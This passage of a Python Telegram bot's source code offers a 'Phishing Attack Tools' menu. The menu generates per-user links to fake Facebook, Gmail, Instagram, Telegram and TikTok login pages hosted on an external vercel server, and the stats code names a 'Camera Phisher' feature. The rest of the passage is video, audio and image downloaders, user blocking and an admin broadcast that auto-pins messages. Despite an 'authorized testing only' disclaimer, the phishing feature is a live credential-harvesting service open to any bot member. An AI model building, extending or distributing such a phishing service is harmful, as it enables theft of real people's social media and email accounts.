        [InlineKeyboardButton("📷 Instagram", callback_data="phish_instagram")],
        [InlineKeyboardButton("✈️ Telegram", callback_data="phish_telegram")],
        [InlineKeyboardButton("🎵 TikTok", callback_data="phish_tiktok")],
        [InlineKeyboardButton("⬅️ Back", callback_data="back_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        text="🎣 Phishing Attack Tools\n\n"
        "Create fake login pages that mimic real platforms for security testing and authorized penetration testing purposes.\n\n"
        "Supported Platforms:\n"
        "📘 Facebook - Replicate Facebook login interface\n"
        "📧 Gmail - Replicate Gmail login interface\n"
        "📷 Instagram - Replicate Instagram login interface\n"
        "✈️ Telegram - Replicate Telegram login interface\n"
        "🎵 TikTok - Replicate TikTok login interface\n\n"
        "Features:\n"
        "• Realistic phishing pages\n"
        "• User-friendly interface\n"
        "• Instant link generation\n"
        "• For authorized testing only\n\n"
        "Select a platform below:",
        reply_markup=reply_markup
    )

async def show_phish_link(update: Update, phish_type: str, user_id: int) -> None:
    """Show Phishing Attack link"""
    urls = {
        "facebook": f"https://server-apix9.vercel.app/facebook/?id={user_id}",
        "gmail": f"https://server-apix9.vercel.app/gmail/?id={user_id}",
        "instagram": f"https://server-apix9.vercel.app/instagram/?id={user_id}",
        "telegram": f"https://server-apix9.vercel.app/telegram/?id={user_id}",
        "tiktok": f"https://server-apix9.vercel.app/tiktok/?id={user_id}"
    }
    
    icons = {
        "facebook": "📘",
        "gmail": "📧",
        "instagram": "📷",
        "telegram": "✈️",
        "tiktok": "🎵"
    }
    
    if phish_type not in urls:
        return
    
    url = urls[phish_type]
    icon = icons.get(phish_type, "🔗")
    
    link_text = f"""{icon} {phish_type.capitalize()} Phishing Attack Link

🌐 Public URL:
{url}

This link will show a realistic {phish_type.capitalize()} Phishing Attack page.

👤 Developer: @mengheang25"""
    
    keyboard = [
        [InlineKeyboardButton("🔗 Open Test", url=url)],
        [InlineKeyboardButton("⬅️ Back", callback_data="phish")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        text=link_text,
        reply_markup=reply_markup
    )

async def show_video_download_menu(update: Update, username: str, user_id: int) -> None:
    """Show video download platform selection menu"""
    keyboard = [
        [InlineKeyboardButton("🎥 TikTok", callback_data="dl_tiktok")],
        [InlineKeyboardButton("📹 Facebook", callback_data="dl_facebook")],
        [InlineKeyboardButton("▶️ YouTube", callback_data="dl_youtube")],
        [InlineKeyboardButton("⬅️ Back", callback_data="back_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        text="🎬 Video Downloader\n\n"
        "Select a platform to download videos from:\n\n"
        "🎥 TikTok - Download without watermark\n"
        "📹 Facebook - Reels & Videos\n"
        "▶️ YouTube - Shorts & Videos\n\n"
        "👇 Choose a platform below:",
        reply_markup=reply_markup
    )

async def show_audio_download_menu(update: Update, username: str, user_id: int) -> None:
    """Show audio/MP3 download platform selection menu"""
    keyboard = [
        [InlineKeyboardButton("🎵 Spotify", callback_data="dl_spotify")],
        [InlineKeyboardButton("▶️ YouTube Music", callback_data="dl_youtube_music")],
        [InlineKeyboardButton("🎧 SoundCloud", callback_data="dl_soundcloud")],
        [InlineKeyboardButton("🎼 Apple Music", callback_data="dl_apple_music")],
        [InlineKeyboardButton("⬅️ Back", callback_data="back_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        text="🎵 MP3 Audio Downloader\n\n"
        "Select a platform to download MP3 from:\n\n"
        "🎵 Spotify - Music & Podcasts\n"
        "▶️ YouTube Music - Music & Playlists\n"
        "🎧 SoundCloud - Tracks & Mixes\n"
        "🎼 Apple Music - Music & Albums\n\n"
        "👇 Choose a platform below:",
        reply_markup=reply_markup
    )

async def show_image_download_menu(update: Update, username: str, user_id: int) -> None:
    """Show image download platform selection menu"""
    keyboard = [
        [InlineKeyboardButton("📷 Instagram", callback_data="dl_image_instagram")],
        [InlineKeyboardButton("📘 Facebook", callback_data="dl_image_facebook")],
        [InlineKeyboardButton("🎵 TikTok", callback_data="dl_image_tiktok")],
        [InlineKeyboardButton("🐦 Twitter/X", callback_data="dl_image_twitter")],
        [InlineKeyboardButton("📌 Pinterest", callback_data="dl_image_pinterest")],
        [InlineKeyboardButton("⬅️ Back", callback_data="back_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        text="🖼️ Image Downloader\n\n"
        "Select a platform to download images from:\n\n"
        "📷 Instagram - Photos & Stories\n"
        "📘 Facebook - Photos & Posts\n"
        "🎵 TikTok - Video Thumbnails\n"
        "🐦 Twitter/X - Images & Media\n"
        "📌 Pinterest - Pins & Images\n\n"
        "👇 Choose a platform below:",
        reply_markup=reply_markup
    )

# ==================== ADMIN FUNCTIONS ====================

async def show_users_list(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show list of all users"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    if user.id != ADMIN_ID:
        return
    
    users = load_users()
    blocked = load_blocked_users()
    
    if not users:
        await query.edit_message_text("No users yet.")
        return
    
    # Create keyboard with paginated users (max 8 per page)
    users_list = list(users.items())
    page = int(context.user_data.get("users_page", 0))
    page_size = 8
    
    start_idx = page * page_size
    end_idx = start_idx + page_size
    current_page_users = users_list[start_idx:end_idx]
    
    keyboard = []
    for uid, udata in current_page_users:
        is_blocked = "❌" if uid in blocked else "✅"
        btn_text = f"{is_blocked} {udata.get('username', 'Unknown')} ({uid})"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"admin_user_select_{uid}")])
    
    # Pagination buttons
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("◀️ Previous", callback_data="admin_users_prev"))
    if end_idx < len(users_list):
        nav_buttons.append(InlineKeyboardButton("Next ▶️", callback_data="admin_users_next"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="admin_back")])
    
    context.user_data["users_page"] = page
    
    await query.edit_message_text(
        text=f"👥 User List (Page {page + 1})\n\nSelect user to manage:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def show_user_actions(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str) -> None:
    """Show actions for specific user"""
    query = update.callback_query
    await query.answer()
    
    users = load_users()
    blocked = load_blocked_users()
    
    if user_id not in users:
        return
    
    user_data = users[user_id]
    is_blocked = user_id in blocked
    
    action_text = f"""User Details:
👤 Username: {user_data.get('username', 'Unknown')}
📝 Name: {user_data.get('first_name', 'Unknown')}
🆔 ID: {user_id}
📅 Joined: {user_data.get('joined_at', 'Unknown')}
{'🚫 Status: BLOCKED' if is_blocked else '✅ Status: ACTIVE'}"""
    
    keyboard = []
    if is_blocked:
        keyboard.append([InlineKeyboardButton("✅ Unblock User", callback_data=f"admin_unblock_{user_id}")])
    else:
        keyboard.append([InlineKeyboardButton("🚫 Block User", callback_data=f"admin_block_{user_id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="admin_users")])
    
    await query.edit_message_text(
        text=action_text,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def show_notification_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show notification input prompt"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    logger.info(f"🔔 Notification button clicked by {user.id} ({user.username or user.first_name})")
    
    if user.id != ADMIN_ID:
        logger.warning(f"❌ Non-admin {user.id} tried to access notification feature")
        await query.edit_message_text("❌ You are not authorized to send notifications.")
        return
    
    context.user_data["waiting_for_notification"] = True
    logger.info(f"✅ Notification mode activated for {user.id}")
    
    await query.edit_message_text(
        text="📢 Send Notification\n\nYou can send:\n- Text messages\n- Voice/Audio\n- Photos\n- Videos\n- Documents/Files\n- Forwarded messages\n\nJust send any content and it will be forwarded to all users.\n\n(Type /cancel to cancel)",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]])
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle all non-command messages (notifications, downloads)"""
    user = update.effective_user
    message_text = update.message.text or ""
    
    # ==================== DOWNLOAD HANDLER ====================
    if context.user_data.get("waiting_for_download_url"):
        # User sent a URL for video/audio download
        platform = context.user_data.get("download_platform")
        is_audio = context.user_data.get("download_is_audio", False)
        
        # Check if yt-dlp is installed
        if not check_yt_dlp_installed():
            await update.message.reply_text(
                "❌ Download service is not available.\n\n"
                "yt-dlp is not installed on the server."
            )
            context.user_data["waiting_for_download_url"] = False
            return
        
        # Validate URL
        if not validate_url(message_text, platform):
            await update.message.reply_text(
                f"❌ Invalid URL for {platform}!\n\n"
                f"Please send a valid {platform} link."
            )
            return
        
        # Send processing message
        status_msg = await update.message.reply_text(
            f"⏳ Processing your {platform} request...\n\n"
            f"Downloading... This may take 1-2 minutes..."
        )
        
        file_path = None
        try:
            # Download based on type
            is_image = context.user_data.get("download_is_image", False)
            if is_image:
                await status_msg.edit_text(
                    f"⏳ Downloading image from {platform}...\n"
                    f"⏱ This may take 1-2 minutes..."
                )
                result = await download_image(message_text, platform)
                
                if result and isinstance(result, dict):
                    file_path = result.get('file_path')
                    temp_dir = result.get('temp_dir')
                    file_size = result.get('filesize', 0)
                    filename = result.get('filename', 'image')
                    
                    # Check file size (Telegram max 50MB for images)
                    max_size = 50 * 1024 * 1024  # 50MB
                    
                    if file_size > max_size:
                        await status_msg.edit_text(
                            f"❌ File too large!\n\n"
                            f"Size: {file_size / (1024*1024):.1f} MB\n"
                            f"Max: 50 MB\n\n"
                            f"Please try a different image or post."
                        )
                    else:
                        # Build caption
                        caption = f"🖼️ Image from {platform}\n"
                        if filename:
                            caption += f"📄 {filename[:100]}\n"
                        caption += f"📦 {file_size / (1024*1024):.1f}MB\n"
                        caption += f"⚡ Developer: @mengheang25"
                        
                        # Update status
                        await status_msg.edit_text(
                            f"📤 Uploading image file...\n"
                            f"({file_size / (1024*1024):.1f} MB)"
                        )
                        
                        # Send image/video file with retry
                        for attempt in range(3):
                            try:
                                await context.bot.send_chat_action(
                                    chat_id=update.message.chat_id,
                                    action="upload_photo" if filename.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')) else "upload_video"
                                )
                                
                                # Determine file type and send accordingly
                                with open(file_path, 'rb') as image_file:
                                    if filename.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                                        # Send as photo
                                        await context.bot.send_photo(
                                            chat_id=update.message.chat_id,
                                            photo=image_file,
                                            caption=caption[:1024],
                                            parse_mode="Markdown",
                                            read_timeout=60,
                                            write_timeout=60,
                                            connect_timeout=60
                                        )
                                    else:
                                        # Send as document
                                        await context.bot.send_document(
                                            chat_id=update.message.chat_id,
                                            document=image_file,
                                            caption=caption[:1024],
                                            parse_mode="Markdown",
                                            read_timeout=60,
                                            write_timeout=60,
                                            connect_timeout=60
                                        )
                                await status_msg.delete()
                                logger.info(f"Image sent successfully: {file_size} bytes")
                                break
                            except asyncio.TimeoutError:
                                if attempt < 2:
                                    await status_msg.edit_text(
                                        f"📤 Uploading image file (Attempt {attempt + 2}/3)...\n"
                                        f"({file_size / (1024*1024):.1f} MB)"
                                    )
                                    await asyncio.sleep(1)
                                else:
                                    logger.error(f"Upload timeout after 3 attempts")
                                    await status_msg.edit_text(
                                        "❌ Upload timeout (slow connection)\n\n"
                                        "Please try again later or use a faster connection."
                                    )
                            except Exception as e:
                                logger.error(f"Error sending image (attempt {attempt + 1}): {e}")
                                if attempt == 2:
                                    error_msg = str(e)
                                    if "too large" in error_msg.lower():
                                        await status_msg.edit_text(f"❌ File too large for Telegram (max 50MB)")
                                    else:
                                        await status_msg.edit_text(f"❌ Failed to send image:\n\n{error_msg[:100]}")
                                else:
                                    await asyncio.sleep(1)
                        
                        # Cleanup
                        if file_path and os.path.exists(file_path):
                            cleanup_file(file_path)
                else:
                    logger.error(f"Image download failed")
                    await status_msg.edit_text(
                        "❌ Download failed!\n\n"
                        "Possible reasons:\n"
                        "• URL format not supported for this platform\n"
                        "• Private or deleted content\n"
                        "• Network timeout\n"
                        "• Content type not supported\n\n"
                        "💡 Tips:\n"
                        "• Try a direct post/video URL (not carousel or album)\n"
                        "• Check that the link is public\n"
                        "• For TikTok: use video URLs (photos may not be supported)\n\n"
                        "Please try another link."
                    )
            elif is_audio:
                await status_msg.edit_text(
                    f"⏳ Downloading audio from {platform}...\n"
                    f"⏱ This may take 1-2 minutes..."
                )
                result = await download_audio(message_text, platform)
                
                if result and isinstance(result, dict):
                    file_path = result.get('file_path')
                    
                    # Check file size (Telegram max 30MB for audio)
                    file_size = result.get('filesize', 0)
                    max_size = 30 * 1024 * 1024  # 30MB
                    
                    if file_size > max_size:
                        await status_msg.edit_text(
                            f"❌ File too large!\n\n"
                            f"Size: {file_size / (1024*1024):.1f} MB\n"
                            f"Max: 50 MB\n\n"
                            f"Please try a shorter audio."
                        )
                    else:
                        # Build detailed caption with metadata
                        title = result.get('title', 'Audio')
                        uploader = result.get('uploader', 'Unknown')
                        duration = result.get('duration', 0)
                        
                        # Format duration
                        duration_str = ""
                        if duration > 0:
                            hours = duration // 3600
                            minutes = (duration % 3600) // 60
                            seconds = duration % 60
                            if hours > 0:
                                duration_str = f"{hours}:{minutes:02d}:{seconds:02d}"
                            else:
                                duration_str = f"{minutes}:{seconds:02d}"
                        
                        caption = f"🎵 {title}\n"
                        caption += f"👤 {uploader}\n"
                        if duration_str:
                            caption += f"⏱️ {duration_str}\n"
                        caption += f"📦 {file_size / (1024*1024):.1f}MB\n"
                        caption += f"📥 Downloaded from {platform}\n"
                        caption += f"⚡ Developer: @mengheang25"
                        
                        # Update status
                        await status_msg.edit_text(
                            f"📤 Uploading MP3 file...\n"
                            f"({file_size / (1024*1024):.1f} MB)"
                        )
                        
                        # Send audio file with retry
                        for attempt in range(3):  # Try 3 times
                            try:
                                await context.bot.send_chat_action(
                                    chat_id=update.message.chat_id,
                                    action="upload_audio"
                                )
                                
                                # Stream file in chunks for faster upload
                                with open(file_path, 'rb') as audio_file:
                                    await context.bot.send_audio(
                                        chat_id=update.message.chat_id,
                                        audio=audio_file,
                                        title=title[:100],
                                        performer=uploader[:100],
                                        duration=int(duration) if duration else 0,
                                        caption=caption[:1024],
                                        parse_mode="Markdown",
                                        read_timeout=60,
                                        write_timeout=60,
                                        connect_timeout=60
                                    )
                                await status_msg.delete()
                                logger.info(f"Audio sent successfully: {file_size} bytes")
                                break
                            except asyncio.TimeoutError:
                                if attempt < 2:
                                    await status_msg.edit_text(
                                        f"📤 Uploading audio file (Attempt {attempt + 2}/3)...\n"
                                        f"({file_size / (1024*1024):.1f} MB)"
                                    )
                                    await asyncio.sleep(1)
                                else:
                                    logger.error(f"Upload timeout after 3 attempts")
                                    await status_msg.edit_text(
                                        "❌ Upload timeout (slow connection)\n\n"
                                        "Please try again later or use a faster connection."
                                    )
                            except Exception as e:
                                logger.error(f"Error sending audio (attempt {attempt + 1}): {e}")
                                if attempt == 2:
                                    error_msg = str(e)
                                    if "too large" in error_msg.lower():
                                        await status_msg.edit_text(f"❌ File too large for Telegram (max 30MB)")
                                    else:
                                        await status_msg.edit_text(f"❌ Failed to send audio:\n\n{error_msg[:100]}")
                                else:
                                    await asyncio.sleep(1)
                        
                        # Cleanup
                        if file_path and os.path.exists(file_path):
                            cleanup_file(file_path)
                else:
                    logger.error(f"Audio download failed: result={result}")
                    await status_msg.edit_text(
                        "❌ Download failed!\n\n"
                        "Possible reasons:\n"
                        "• Invalid or private link\n"
                        "• Content not available\n"
                        "• Network timeout\n"
                        "• yt-dlp service issue\n\n"
                        "Please try another link."
                    )
            elif is_image:
                await status_msg.edit_text(
                    f"⏳ Downloading images from {platform}...\n"
                    f"⏱ This may take 1-2 minutes..."
                )
                result = await download_image(message_text, platform)
                
                if result and isinstance(result, dict):
                    file_path = result.get('file_path')
                    temp_dir = result.get('temp_dir')
                    all_files = result.get('all_files', [])
                    
                    # Check file size (Telegram max 50MB for images)
                    file_size = result.get('filesize', 0)
                    max_size = 50 * 1024 * 1024  # 50MB
                    
                    if file_size > max_size:
                        await status_msg.edit_text(
                            f"❌ File too large!\n\n"
                            f"Size: {file_size / (1024*1024):.1f} MB\n"
                            f"Max: 50 MB\n\n"
                            f"Please try a smaller image or shorter video."
                        )
                    else:
                        # Build detailed caption with metadata
                        filename = result.get('filename', 'Image')
                        title = result.get('title', 'Image')
                        
                        caption = f"🖼️ {title}\n"
                        if len(all_files) > 1:
                            caption += f"📦 {len(all_files)} files found\n"
                        caption += f"📦 Size: {file_size / (1024*1024):.1f}MB\n"
                        caption += f"📥 Downloaded from {platform}\n"
                        caption += f"⚡ Developer: @mengheang25"
                        
                        # Update status
                        await status_msg.edit_text(
                            f"📤 Uploading image file...\n"
                            f"({file_size / (1024*1024):.1f} MB)"
                        )
                        
                        # Detect file type and send accordingly
                        file_ext = os.path.splitext(filename)[1].lower()
                        
                        # Send file with retry
                        for attempt in range(3):  # Try 3 times
                            try:
                                with open(file_path, 'rb') as img_file:
                                    if file_ext in ['.jpg', '.jpeg', '.png', '.webp', '.gif']:
                                        # Send as photo
                                        await context.bot.send_chat_action(
                                            chat_id=update.message.chat_id,
                                            action="upload_photo"
                                        )
                                        await context.bot.send_photo(
                                            chat_id=update.message.chat_id,
                                            photo=img_file,
                                            caption=caption[:1024],
                                            parse_mode="Markdown",
                                            read_timeout=60,
                                            write_timeout=60,
                                            connect_timeout=60
                                        )
                                    elif file_ext in ['.mp4', '.webm']:
                                        # Send as video
                                        await context.bot.send_chat_action(
                                            chat_id=update.message.chat_id,
                                            action="upload_video"
                                        )
                                        await context.bot.send_video(
                                            chat_id=update.message.chat_id,
                                            video=img_file,
                                            caption=caption[:1024],
                                            parse_mode="Markdown",
                                            read_timeout=60,
                                            write_timeout=60,
                                            connect_timeout=60
                                        )
                                    else:
                                        # Send as document
                                        await context.bot.send_chat_action(
                                            chat_id=update.message.chat_id,
                                            action="upload_document"
                                        )
                                        await context.bot.send_document(
                                            chat_id=update.message.chat_id,
                                            document=img_file,
                                            caption=caption[:1024],
                                            parse_mode="Markdown",
                                            read_timeout=60,
                                            write_timeout=60,
                                            connect_timeout=60
                                        )
                                await status_msg.delete()
                                logger.info(f"Image sent successfully: {file_size} bytes")
                                break
                            except asyncio.TimeoutError:
                                if attempt < 2:
                                    await status_msg.edit_text(
                                        f"📤 Uploading image file (Attempt {attempt + 2}/3)...\n"
                                        f"({file_size / (1024*1024):.1f} MB)"
                                    )
                                    await asyncio.sleep(1)
                                else:
                                    logger.error(f"Upload timeout after 3 attempts")
                                    await status_msg.edit_text(
                                        "❌ Upload timeout (slow connection)\n\n"
                                        "Please try again later or use a faster connection."
                                    )
                            except Exception as e:
                                logger.error(f"Error sending image (attempt {attempt + 1}): {e}")
                                if attempt == 2:
                                    error_msg = str(e)
                                    if "too large" in error_msg.lower():
                                        await status_msg.edit_text(f"❌ File too large for Telegram (max 50MB)")
                                    else:
                                        await status_msg.edit_text(f"❌ Failed to send image:\n\n{error_msg[:100]}")
                                else:
                                    await asyncio.sleep(1)
                        
                        # Cleanup
                        if file_path and os.path.exists(file_path):
                            cleanup_file(file_path)
                else:
                    logger.error(f"Image download failed: result={result}")
                    await status_msg.edit_text(
                        "❌ Download failed!\n\n"
                        "Possible reasons:\n"
                        "• Invalid or private link\n"
                        "• Content not available\n"
                        "• Network timeout\n"
                        "• yt-dlp service issue\n\n"
                        "Please try another link."
                    )
            else:
                await status_msg.edit_text(
                    f"⏳ Downloading video from {platform}...\n"
                    f"⏱ This may take 1-2 minutes..."
                )
                result = await download_video(message_text, platform)
                
                if result and isinstance(result, dict):
                    file_path = result.get('file_path')
                    temp_dir = result.get('temp_dir')
                    
                    # Check file size (Telegram max 50MB for video)
                    file_size = result.get('filesize', 0)
                    max_size = 50 * 1024 * 1024  # 50MB
                    
                    if file_size > max_size:
                        await status_msg.edit_text(
                            f"❌ File too large!\n\n"
                            f"Size: {file_size / (1024*1024):.1f} MB\n"
                            f"Max: 50 MB\n\n"
                            f"Please try a shorter video."
                        )
                    else:
                        # Build detailed caption with metadata
                        caption = f"🎬 {result.get('title', 'Video')}\n"
                        if result.get('uploader'):
                            caption += f"👤 By: {result['uploader']}\n"
                        
                        duration = result.get('duration', 0)
                        if duration > 0:
                            hours = duration // 3600
                            minutes = (duration % 3600) // 60
                            seconds = duration % 60
                            if hours > 0:
                                caption += f"⏱ Duration: {hours}:{minutes:02d}:{seconds:02d}\n"
                            else:
                                caption += f"⏱ Duration: {minutes}:{seconds:02d}\n"
                        
                        if file_size > 0:
                            caption += f"📦 Size: {file_size / (1024*1024):.1f}MB\n"
                        
                        if result.get('height'):
                            caption += f"📺 Quality: {result.get('height')}p\n"
                        
                        caption += f"📥 Downloaded from {platform}\n"
                        caption += f"⚡ Developer: @mengheang25"
                        
                        # Update status
                        await status_msg.edit_text(
                            f"📤 Uploading video file...\n"
                            f"({file_size / (1024*1024):.1f} MB)"
                        )
                        
                        # Send video file with retry
                        for attempt in range(3):  # Try 3 times
                            try:
                                await context.bot.send_chat_action(
                                    chat_id=update.message.chat_id,
                                    action="upload_video"
                                )
                                
                                # Stream file in chunks for faster upload
                                with open(file_path, 'rb') as video_file:
                                    await context.bot.send_video(
                                        chat_id=update.message.chat_id,
                                        video=video_file,
                                        caption=caption[:1024],
                                        parse_mode="Markdown",
                                        read_timeout=60,
                                        write_timeout=60,
                                        connect_timeout=60
                                    )
                                await status_msg.delete()
                                logger.info(f"Video sent successfully: {file_size} bytes")
                                break
                            except asyncio.TimeoutError:
                                if attempt < 2:
                                    await status_msg.edit_text(
                                        f"📤 Uploading video file (Attempt {attempt + 2}/3)...\n"
                                        f"({file_size / (1024*1024):.1f} MB)"
                                    )
                                    await asyncio.sleep(1)
                                else:
                                    logger.error(f"Upload timeout after 3 attempts")
                                    await status_msg.edit_text(
                                        "❌ Upload timeout (slow connection)\n\n"
                                        "Please try again later or use a faster connection."
                                    )
                            except Exception as e:
                                logger.error(f"Error sending video (attempt {attempt + 1}): {e}")
                                if attempt == 2:
                                    error_msg = str(e)
                                    if "too large" in error_msg.lower():
                                        await status_msg.edit_text(f"❌ File too large for Telegram (max 30MB)")
                                    else:
                                        await status_msg.edit_text(f"❌ Failed to send video:\n\n{error_msg[:100]}")
                                else:
                                    await asyncio.sleep(1)
                        
                        # Cleanup
                        if file_path and os.path.exists(file_path):
                            cleanup_file(file_path)
                else:
                    logger.error(f"Video download failed: result={result}")
                    await status_msg.edit_text(
                        "❌ Download failed!\n\n"
                        "Possible reasons:\n"
                        "• Invalid or private link\n"
                        "• Content not available\n"
                        "• Network timeout\n"
                        "• yt-dlp service issue\n\n"
                        "Please try another link."
                    )
                    
        except Exception as e:
            logger.error(f"Download error: {e}")
            await status_msg.edit_text(
                "❌ An error occurred during download.\n\n"
                "Please try again with a different link."
            )
        
        # Reset download state
        context.user_data["waiting_for_download_url"] = False
        context.user_data["download_platform"] = None
        context.user_data["download_is_audio"] = False
        return
    
    # ==================== NOTIFICATION HANDLER ====================
    if user.id != ADMIN_ID or not context.user_data.get("waiting_for_notification"):
        return
    
    logger.info(f"📢 Notification message received from admin {user.id}: waiting_for_notification={context.user_data.get('waiting_for_notification')}")
    
    try:
        # Check for /cancel command
        if message_text == "/cancel":
            context.user_data["waiting_for_notification"] = False
            await update.message.reply_text("Notification cancelled.")
            return
        
        users = load_users()
        blocked = load_blocked_users()
        
        sent_count = 0
        failed_count = 0
        
        await update.message.reply_text(f"📤 Sending notification to {len(users)} users...")
        
        # Send notification to all non-blocked users
        for uid in users.keys():
            if uid not in blocked:
                max_retries = 3
                retry_count = 0
                success = False
                
                while retry_count < max_retries and not success:
                    try:
                        sent_message = None
                        
                        # Forward message if it's forwarded
                        if update.message.forward_from or update.message.forward_from_chat:
                            sent_message = await context.bot.forward_message(
                                chat_id=int(uid),
                                from_chat_id=update.message.chat_id,
                                message_id=update.message.message_id
                            )
                        # Handle text messages
                        elif update.message.text:
                            sent_message = await context.bot.send_message(
                                chat_id=int(uid),
                                text=f"📢 Notification from Admin:\n\n{update.message.text}",
                                parse_mode="Markdown"
                            )
                        # Handle photos
                        elif update.message.photo:
                            photo = update.message.photo[-1]
                            caption = f"📢 Notification from Admin:\n\n{update.message.caption or ''}" if update.message.caption else "📢 Notification from Admin"
                            sent_message = await context.bot.send_photo(
                                chat_id=int(uid),
                                photo=photo.file_id,
                                caption=caption,
                                parse_mode="Markdown"
                            )
                        # Handle voice messages
                        elif update.message.voice:
                            voice = update.message.voice
                            caption = f"📢 Notification from Admin:\n\n{update.message.caption or ''}" if update.message.caption else "📢 Notification from Admin"
                            sent_message = await context.bot.send_voice(
                                chat_id=int(uid),
                                voice=voice.file_id,
                                caption=caption,
                                parse_mode="Markdown"
                            )
                        # Handle audio messages
                        elif update.message.audio:
                            audio = update.message.audio
                            caption = f"📢 Notification from Admin:\n\n{update.message.caption or ''}" if update.message.caption else "📢 Notification from Admin"
                            sent_message = await context.bot.send_audio(
                                chat_id=int(uid),
                                audio=audio.file_id,
                                caption=caption,
                                parse_mode="Markdown"
                            )
                        # Handle videos
                        elif update.message.video:
                            video = update.message.video
                            caption = f"📢 Notification from Admin:\n\n{update.message.caption or ''}" if update.message.caption else "📢 Notification from Admin"
                            sent_message = await context.bot.send_video(
                                chat_id=int(uid),
                                video=video.file_id,
                                caption=caption,
                                parse_mode="Markdown"
                            )
                        # Handle documents/files
                        elif update.message.document:
                            document = update.message.document
                            caption = f"📢 Notification from Admin:\n\n{update.message.caption or ''}" if update.message.caption else "📢 Notification from Admin"
                            sent_message = await context.bot.send_document(
                                chat_id=int(uid),
                                document=document.file_id,
                                caption=caption,
                                parse_mode="Markdown"
                            )
                        
                        # Auto-pin the message immediately
                        if sent_message:
                            try:
                                await context.bot.pin_chat_message(
                                    chat_id=int(uid),
                                    message_id=sent_message.message_id,
                                    disable_notification=True
                                )
                            except Exception as pin_error:
                                logger.warning(f"Could not pin message for {uid}: {pin_error}")
                        
                        sent_count += 1
                        success = True
                        
                    except NetworkError as e:
                        retry_count += 1
                        if retry_count < max_retries:
                            logger.warning(f"Network error for {uid} (attempt {retry_count}/{max_retries}): {e}")
                            await asyncio.sleep(2)  # Wait 2 seconds before retrying
                        else:
                            logger.error(f"Failed to send to {uid} after {max_retries} attempts: {e}")
                            failed_count += 1
                    except TelegramError as e:
                        # Don't retry for telegram errors like blocked user
                        logger.warning(f"Telegram error for {uid}: {e}")
                        failed_count += 1
                        success = True  # Don't retry telegram errors
                    except Exception as e:
                        retry_count += 1
                        if retry_count < max_retries:
                            logger.warning(f"Error for {uid} (attempt {retry_count}/{max_retries}): {e}")
                            await asyncio.sleep(1)  # Wait 1 second before retrying
                        else:
                            logger.error(f"Failed to send to {uid} after {max_retries} attempts: {e}")
                            failed_count += 1
                
                # Add delay between sends to avoid rate limiting (100ms per user)
                await asyncio.sleep(0.1)
        
        await update.message.reply_text(
            f"✅ Notification sent!\n\n✅ Sent: {sent_count}\n❌ Failed: {failed_count}"
        )
    
    except Exception as e:
        logger.error(f"Error in notification handler: {e}", exc_info=True)
        try:
            await update.message.reply_text(f"❌ Error sending notification: {str(e)[:100]}")
        except:
            pass
    
    finally:
        context.user_data["waiting_for_notification"] = False

# ==================== CALLBACKS ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle all button clicks"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    username = user.username if user.username else user.first_name
    user_id = user.id
    
    # Check if user is blocked
    if is_user_blocked(user_id) and query.data != "check_join":
        await query.edit_message_text("❌ You are blocked from using this bot.")
        return
    
    # Check if user is member before showing menu
    is_member = await check_channel_membership(context, user_id)
    
    if not is_member and query.data not in ["check_join", "back_main"]:
        await show_join_button(update, username)
        return
    
    # Admin handlers
    if query.data == "admin_users":
        context.user_data["users_page"] = 0
        await show_users_list(update, context)
    elif query.data == "admin_users_prev":
        context.user_data["users_page"] = max(0, int(context.user_data.get("users_page", 0)) - 1)
        await show_users_list(update, context)
    elif query.data == "admin_users_next":
        context.user_data["users_page"] = int(context.user_data.get("users_page", 0)) + 1
        await show_users_list(update, context)
    elif query.data.startswith("admin_user_select_"):
        uid = query.data.replace("admin_user_select_", "")
        await show_user_actions(update, context, uid)
    elif query.data.startswith("admin_block_"):
        uid = query.data.replace("admin_block_", "")
        block_user(uid)
        await query.edit_message_text(f"✅ User {uid} has been blocked.")
        await show_user_actions(update, context, uid)
    elif query.data.startswith("admin_unblock_"):
        uid = query.data.replace("admin_unblock_", "")
        unblock_user(uid)
        await query.edit_message_text(f"✅ User {uid} has been unblocked.")
        await show_user_actions(update, context, uid)
    elif query.data == "admin_notification":
        await show_notification_input(update, context)
    elif query.data == "admin_reset_stats":
        # Reset all statistics
        reset_usage = {
            "cam": 0,
            "phish_facebook": 0,
            "phish_gmail": 0,
            "phish_instagram": 0,
            "phish_telegram": 0,
            "phish_tiktok": 0,
            "dl_tiktok": 0,
            "dl_facebook": 0,
            "dl_youtube": 0,
            "dl_spotify": 0,
            "dl_youtube_music": 0,
            "dl_soundcloud": 0,
            "dl_apple_music": 0
        }
        save_feature_usage(reset_usage)
        await query.edit_message_text("✅ Statistics have been reset!")
    elif query.data == "admin_back":
        # Reset notification mode if active
        context.user_data["waiting_for_notification"] = False
        
        total_users = get_total_users()
        active_users = get_active_users()
        blocked_users = len(load_blocked_users())
        usage = load_feature_usage()
        
        # Get most and least used features
        feature_names = {
            "cam": "📷 Camera Phisher",
            "phish_facebook": "📘 Facebook Phishing",
